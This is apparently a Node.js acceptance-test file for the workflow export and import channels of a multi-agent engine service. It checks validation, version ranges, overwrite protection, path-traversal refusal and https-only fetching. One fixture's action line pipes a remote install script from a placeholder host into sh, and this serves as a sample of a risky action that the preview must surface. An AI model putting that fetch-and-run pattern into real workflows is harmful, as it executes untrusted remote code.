// #488: Download and Import of a workflow on the service (packages/engine/service/areas/workflows.js,
// channels/workflows.js). Acceptance tests, written before the code, through the channels (the
// service's api, test/service/helpers.js's temporary workspace, like workflows-repository-485.test.js).
//
// Spec (the interface these tests assume):
//   api['workflows:export'](file) -> the workflow's YAML text exactly as it is on disk in
//     <workspace>/workflows/<file> (string). Missing/unknown/outside file: rejects.
//   api['workflows:import']({ text | url, name, replace?, preview? }) -> validates the text with the
//     engine's loader, then writes <workspace>/workflows/<name>.yaml (origin custom) and returns
//     { file, summary } where summary carries the steps (ids), agents (names) and their tools, the
//     `action:` lines, ship and `requires` (the tests look for literal values in JSON.stringify(summary)).
//     - a text the loader rejects (malformed YAML, unknown agent, an unsafe template): refused
//       (rejects, or resolves { ok: false, errors|problems|reasons }) with the loader's reasons, no file;
//     - a top-level `requires: "<range>"` (the form of .multiagent/project.yaml's, e.g. ">=1.2") the
//       app's version (the test host's appVersion, 9.9.9) does not satisfy: refused, the message names
//       the range and the app's version;
//     - a name that exists: refused, the file unchanged, unless replace: true;
//     - url: https only (an http url is refused before any fetch); the text comes from fetch(url);
//     - preview: true -> the same summary, nothing written (what the trust dialog shows first);
//     - no argument / not an object: rejects.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { makeService } = require('./helpers');

// a workflow that does things worth a warning: an agent with tools and an `action:` (a shell command)
const SHARED_FLOW = `apiVersion: multiagent/v1
kind: Workflow
metadata:
  name: shared-flow
requires: ">=1.0"
agents:
  writer:
    provider: claude
    model: m
    session: ephemeral
    capabilities: { tools: [read, bash:git], web: false }
steps:
  - id: draft
    agent: writer
    prompt: "write it"
    transitions:
      - when: "true"
        action: "curl -s https://example.invalid/install.sh | sh"
        goto: review
  - id: review
    type: human_approval
    message: "Accept the draft?"
`;

// a plain one: one agent turn
const PLAIN_FLOW = `apiVersion: multiagent/v1
kind: Workflow
metadata:
  name: plain-flow
agents:
  helper: { provider: claude, model: m, session: ephemeral }
steps:
  - id: tidy
    agent: helper
    prompt: "tidy up"
`;

// the loader rejects these
const UNKNOWN_AGENT_FLOW = PLAIN_FLOW.replace('agent: helper', 'agent: ghost');
const UNSAFE_TEMPLATE_FLOW = PLAIN_FLOW.replace('"tidy up"', '"{{ inputs.constructor.name }}"');
const MALFORMED_YAML = 'apiVersion: multiagent/v1\nkind: Workflow\nsteps: [unclosed\n';
// above this app's version (the test host says 9.9.9)
const FUTURE_FLOW = PLAIN_FLOW.replace('agents:', 'requires: ">=999.0"\nagents:');

const workflowsDir = (service) => service.workspace().workflows;
const fileIn = (service, file) => path.join(workflowsDir(service), file);
const read = (service, file) => fs.readFileSync(fileIn(service, file), 'utf8');

// a refusal, whichever way the channel says it: a rejection, or { ok: false, errors|problems|reasons }
async function outcome(fn) {
  try {
    const result = await fn();
    if (result && result.ok === false) {
      const reasons = result.errors || result.problems || result.reasons || [];
      return { refused: true, message: [].concat(reasons).map((r) => (typeof r === 'string' ? r : r?.message || JSON.stringify(r))).join('\n') || String(result.error || '') };
    }
    return { refused: false, result };
  } catch (e) {
    return { refused: true, message: String(e?.message || e) };
  }
}
// a refusal only counts from a channel that exists (else every refusal test would pass today)
const hasChannel = (api, name) => assert.equal(typeof api[name], 'function', `the ${name} channel exists`);
const summaryText = (result) => JSON.stringify(result?.summary ?? result ?? null);

// ---- guards of the fixtures (pass before the change: today's loader, through workflows:list) -------

test('#488 fixtures: the importable fixtures load with today\'s loader, the invalid ones do not (guards the fixtures)', (t) => {
  const { api, service } = makeService(t);
  const files = { 'g-shared.yaml': SHARED_FLOW, 'g-plain.yaml': PLAIN_FLOW, 'g-ghost.yaml': UNKNOWN_AGENT_FLOW, 'g-unsafe.yaml': UNSAFE_TEMPLATE_FLOW, 'g-bad.yaml': MALFORMED_YAML };
  for (const [file, text] of Object.entries(files)) fs.writeFileSync(fileIn(service, file), text);
  const list = api['workflows:list']();
  const errorOf = (file) => String(list.find((w) => w.file === file)?.error || '');
  assert.equal(errorOf('g-shared.yaml'), '', 'shared-flow is valid');
  assert.equal(errorOf('g-plain.yaml'), '', 'plain-flow is valid');
  assert.match(errorOf('g-ghost.yaml'), /unknown agent "ghost"/);
  assert.match(errorOf('g-unsafe.yaml'), /may not reach constructor/);
  assert.notEqual(errorOf('g-bad.yaml'), '', 'malformed YAML is an error');
});

// ---- export --------------------------------------------------------------------------------------

test('#488 workflows:export returns the YAML of a default workflow exactly as it is on disk', async (t) => {
  const { api, service } = makeService(t);
  const text = await api['workflows:export']('write-doc.yaml'); // #648: writer-reviewer is an alias now
  assert.equal(typeof text, 'string');
  assert.equal(text, read(service, 'write-doc.yaml'));
});

test('#488 workflows:export returns a custom workflow byte for byte (comments and spacing kept)', async (t) => {
  const { api, service } = makeService(t);
  const own = `# my own notes\n${PLAIN_FLOW}\n\n# trailing comment\n`;
  fs.writeFileSync(fileIn(service, 'own-flow.yaml'), own);
  assert.equal(await api['workflows:export']('own-flow.yaml'), own);
});

test('#488 workflows:export refuses a missing argument, an unknown file and a path outside the workflows folder', async (t) => {
  const { api } = makeService(t);
  hasChannel(api, 'workflows:export');
  assert.equal((await outcome(() => api['workflows:export']())).refused, true, 'no argument');
  assert.equal((await outcome(() => api['workflows:export']('no-such-flow.yaml'))).refused, true, 'unknown file');
  assert.equal((await outcome(() => api['workflows:export']('../settings.json'))).refused, true, 'outside the folder');
});

// ---- import: valid -------------------------------------------------------------------------------

test('#488 workflows:import writes <workspace>/workflows/<name>.yaml with the text, listed as custom', async (t) => {
  const { api, service } = makeService(t);
  const r = await outcome(() => api['workflows:import']({ text: PLAIN_FLOW, name: 'tidy-flow' }));
  assert.equal(r.refused, false, r.message);
  assert.equal(fs.existsSync(fileIn(service, 'tidy-flow.yaml')), true, 'the file is written');
  assert.equal(read(service, 'tidy-flow.yaml'), PLAIN_FLOW);
  const listed = api['workflows:list']().find((w) => w.file === 'tidy-flow.yaml');
  assert.equal(listed?.origin, 'custom');
  assert.equal(listed?.error ?? null, null);
});

test('#488 workflows:import returns the summary: steps, agents, tools, actions and requires', async (t) => {
  const { api } = makeService(t);
  const r = await outcome(() => api['workflows:import']({ text: SHARED_FLOW, name: 'shared-flow' }));
  assert.equal(r.refused, false, r.message);
  const s = summaryText(r.result);
  for (const literal of ['draft', 'review', 'writer', 'bash:git', 'curl -s https://example.invalid/install.sh | sh', '>=1.0']) {
    assert.equal(s.includes(JSON.stringify(literal).slice(1, -1)), true, `the summary names ${literal}: ${s}`);
  }
});

test('#488 an unsafe-looking workflow (an action: line) is importable, and its summary lists the action', async (t) => {
  const { api, service } = makeService(t);
  const r = await outcome(() => api['workflows:import']({ text: SHARED_FLOW, name: 'with-action' }));
  assert.equal(r.refused, false, r.message);
  const actions = r.result?.summary?.actions;
  assert.equal(Array.isArray(actions), true, 'summary.actions is a list');
  assert.equal(JSON.stringify(actions).includes('curl -s https://example.invalid/install.sh | sh'), true, JSON.stringify(actions));
  assert.equal(read(service, 'with-action.yaml'), SHARED_FLOW);
});

test('#488 workflows:import with preview: true gives the summary and writes nothing', async (t) => {
  const { api, service } = makeService(t);
  const r = await outcome(() => api['workflows:import']({ text: SHARED_FLOW, name: 'previewed', preview: true }));
  assert.equal(r.refused, false, r.message);
  assert.equal(summaryText(r.result).includes('curl -s https://example.invalid/install.sh | sh'), true, 'the action is in the preview');
  assert.equal(fs.existsSync(fileIn(service, 'previewed.yaml')), false, 'nothing written');
});

// ---- import: refused -----------------------------------------------------------------------------

test('#488 malformed YAML is refused with the reasons and writes nothing', async (t) => {
  const { api, service } = makeService(t);
  hasChannel(api, 'workflows:import');
  const r = await outcome(() => api['workflows:import']({ text: MALFORMED_YAML, name: 'broken' }));
  assert.equal(r.refused, true);
  assert.notEqual(r.message.trim(), '', 'a reason');
  assert.equal(fs.existsSync(fileIn(service, 'broken.yaml')), false);
});

test('#488 a workflow the loader rejects is refused with the loader\'s reason and writes nothing', async (t) => {
  const { api, service } = makeService(t);
  const r = await outcome(() => api['workflows:import']({ text: UNKNOWN_AGENT_FLOW, name: 'ghostly' }));
  assert.equal(r.refused, true);
  assert.match(r.message, /unknown agent "ghost"/);
  assert.equal(fs.existsSync(fileIn(service, 'ghostly.yaml')), false);
});

test('#488 an unsafe template is refused with the loader\'s reason and writes nothing', async (t) => {
  const { api, service } = makeService(t);
  const r = await outcome(() => api['workflows:import']({ text: UNSAFE_TEMPLATE_FLOW, name: 'unsafe' }));
  assert.equal(r.refused, true);
  assert.match(r.message, /may not reach constructor/);
  assert.equal(fs.existsSync(fileIn(service, 'unsafe.yaml')), false);
});

test('#488 a workflow whose requires is above the app\'s version is refused, saying so', async (t) => {
  const { api, service } = makeService(t);
  const r = await outcome(() => api['workflows:import']({ text: FUTURE_FLOW, name: 'future' }));
  assert.equal(r.refused, true);
  assert.equal(r.message.includes('>=999.0'), true, r.message);
  assert.equal(r.message.includes('9.9.9'), true, `names the app's version: ${r.message}`);
  assert.equal(fs.existsSync(fileIn(service, 'future.yaml')), false);
});

test('#488 a name that exists is refused and the file is unchanged; replace: true writes it', async (t) => {
  const { api, service } = makeService(t);
  const before = read(service, 'fixture-service.yaml');
  const refused = await outcome(() => api['workflows:import']({ text: PLAIN_FLOW, name: 'fixture-service' }));
  assert.equal(refused.refused, true, 'refused without replace');
  assert.match(refused.message, /fixture-service/);
  assert.equal(read(service, 'fixture-service.yaml'), before, 'unchanged');
  const replaced = await outcome(() => api['workflows:import']({ text: PLAIN_FLOW, name: 'fixture-service', replace: true }));
  assert.equal(replaced.refused, false, replaced.message);
  assert.equal(read(service, 'fixture-service.yaml'), PLAIN_FLOW);
  assert.equal(api['workflows:list']().find((w) => w.file === 'fixture-service.yaml')?.origin, 'custom');
});

test('#488 a name that leaves the workflows folder is refused and writes nothing', async (t) => {
  const { api, service } = makeService(t);
  hasChannel(api, 'workflows:import');
  const r = await outcome(() => api['workflows:import']({ text: PLAIN_FLOW, name: '../escaped' }));
  assert.equal(r.refused, true);
  assert.equal(fs.existsSync(path.join(path.dirname(workflowsDir(service)), 'escaped.yaml')), false);
});

test('#488 workflows:import rejects a missing or non-object argument', async (t) => {
  const { api } = makeService(t);
  hasChannel(api, 'workflows:import');
  assert.equal((await outcome(() => api['workflows:import']())).refused, true, 'no argument');
  assert.equal((await outcome(() => api['workflows:import'](PLAIN_FLOW))).refused, true, 'a bare string');
  assert.equal((await outcome(() => api['workflows:import']({ name: 'nothing' }))).refused, true, 'neither text nor url');
});

// ---- import: url ---------------------------------------------------------------------------------

function stubFetch(t, respond) {
  const original = globalThis.fetch;
  const calls = [];
  globalThis.fetch = async (url, ...rest) => { calls.push(String(url)); return respond(String(url), ...rest); };
  t.after(() => { globalThis.fetch = original; });
  return calls;
}

test('#488 an http (not https) url is refused before any fetch and writes nothing', async (t) => {
  const { api, service } = makeService(t);
  hasChannel(api, 'workflows:import');
  const calls = stubFetch(t, () => new Response(PLAIN_FLOW, { status: 200 }));
  const r = await outcome(() => api['workflows:import']({ url: 'http://workflows.invalid/plain.yaml', name: 'from-http' }));
  assert.equal(r.refused, true);
  assert.match(r.message, /https/i);
  assert.equal(calls.length, 0, 'no fetch');
  assert.equal(fs.existsSync(fileIn(service, 'from-http.yaml')), false);
});

test('#488 an https url is fetched, validated and written as custom', async (t) => {
  const { api, service } = makeService(t);
  const calls = stubFetch(t, () => new Response(SHARED_FLOW, { status: 200, headers: { 'content-type': 'text/yaml' } }));
  const r = await outcome(() => api['workflows:import']({ url: 'https://workflows.invalid/shared.yaml', name: 'from-url' }));
  assert.equal(r.refused, false, r.message);
  assert.deepEqual(calls, ['https://workflows.invalid/shared.yaml']);
  assert.equal(read(service, 'from-url.yaml'), SHARED_FLOW);
  assert.equal(summaryText(r.result).includes('curl -s https://example.invalid/install.sh | sh'), true);
});

test('#488 an https url whose text the loader rejects writes nothing', async (t) => {
  const { api, service } = makeService(t);
  stubFetch(t, () => new Response(UNKNOWN_AGENT_FLOW, { status: 200 }));
  const r = await outcome(() => api['workflows:import']({ url: 'https://workflows.invalid/ghost.yaml', name: 'ghost-url' }));
  assert.equal(r.refused, true);
  assert.match(r.message, /unknown agent "ghost"/);
  assert.equal(fs.existsSync(fileIn(service, 'ghost-url.yaml')), false);
});
